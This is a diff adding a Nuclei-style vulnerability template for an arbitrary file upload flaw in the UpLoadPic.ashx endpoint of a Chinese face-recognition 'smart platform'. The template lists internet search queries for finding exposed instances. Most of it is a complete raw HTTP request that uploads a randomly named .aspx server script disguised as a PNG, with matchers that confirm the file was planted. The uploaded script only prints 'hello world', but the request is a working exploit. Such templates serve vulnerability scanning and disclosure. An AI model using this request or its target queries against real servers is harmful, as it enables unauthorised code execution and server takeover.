@@ -1,0 +1,53 @@
+id: lianaiyun-UpLoadPic-upload
+
+info:
+  name: 脸爱云一脸通智慧平台UpLoadPic任意文件上传漏洞
+  author: Simple
+  severity: high
+  description: |
+    深圳市优卡特电子有限公司脸爱云一脸通智慧管理平台UpLoadPic存在文件上传漏洞。攻击者可以利用UpLoadPic.ashx进行任意文件上传，获取目标服务器权限。
+  reference:
+    - https://github.com/JJThome
+  metadata:
+    fofa-query: body="View/UserReserved/UserReservedTest.aspx"
+    quake-query: body:"View/UserReserved/UserReservedTest.aspx"
+    hunter-query: web.body="View/UserReserved/UserReservedTest.aspx"
+
+variables:
+  filename: '{{rand_base(6)}}'
+
+http:
+  - raw:
+      - |
+        POST /UpLoadPic.ashx HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywt7cEu1eBdibB13u
+        Accept-Language: zh-CN,zh;q=0.9
+
+        ------WebKitFormBoundarywt7cEu1eBdibB13u
+        Content-Disposition: form-data; name="action"
+        
+        post
+        ------WebKitFormBoundarywt7cEu1eBdibB13u
+        Content-Disposition: form-data; name="myPhoto"; filename="{{filename}}.aspx"
+        Content-Type: image/png
+        
+        <% response.write("hello world") %>
+        ------WebKitFormBoundarywt7cEu1eBdibB13u
+        Content-Disposition: form-data; name="oldName"
+        
+        
+        ------WebKitFormBoundarywt7cEu1eBdibB13u--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,"/images")
+          - contains(body,".aspx")
+        condition: and
